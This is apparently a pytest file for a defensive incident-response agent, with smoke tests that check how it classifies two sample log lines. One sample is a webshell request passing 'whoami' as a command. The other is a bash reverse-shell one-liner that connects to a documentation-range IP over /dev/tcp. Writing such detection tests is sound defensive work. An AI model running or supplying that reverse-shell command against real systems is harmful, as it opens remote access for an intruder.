import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from blueir_agent.agent import BlueIRAgent


def test_webshell_smoke():
    state = BlueIRAgent().analyze("POST /upload/shell.php?cmd=whoami from 192.0.2.10")
    assert state.findings
    assert state.incident_type == "webshell_or_web_intrusion"
    assert "192.0.2.10" in state.iocs["ipv4"]


def test_linux_ir_smoke():
    state = BlueIRAgent().analyze("2026-05-19 09:06:14 bash -i >& /dev/tcp/203.0.113.77/4444 0>&1")
    assert state.findings
    assert state.incident_type == "linux_ir_triage"
    assert state.timeline
